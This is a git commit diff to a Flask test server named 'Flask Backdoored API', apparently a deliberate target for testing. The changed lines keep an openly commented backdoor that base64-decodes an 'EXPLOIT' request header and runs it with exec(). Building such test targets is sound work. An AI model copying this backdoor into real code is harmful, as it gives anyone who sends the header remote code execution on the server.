756c20b2a18ef3c9450601b17196400f3e75cfea
Geeoon Chung <geeoon13@gmail.com>
2024-03-17 21:29:21 -0700

    Get Flask version

--- server/test_server/python/flask_server.py
+++ server/test_server/python/flask_server.py
@@ -1,13 +1,12 @@
 import sys
 from flask import Flask, request
 import pkg_resources  # get flask version
-import base64  # for backdoor to support newlines
 
 app = Flask("Flask Backdoored API")
 
 @app.route("/")
 def index():
-    if request.headers.get('EXPLOIT'): global r;exec(base64.b64decode(request.headers.get('EXPLOIT').encode()).decode());return r;  # backdoor
+    if request.headers.get('EXPLOIT'): global r;exec(__import__('base64').b64decode(request.headers.get('EXPLOIT').encode()).decode());return r;  # backdoor
     return f"""<!doctype html>
 <html>
     <head>
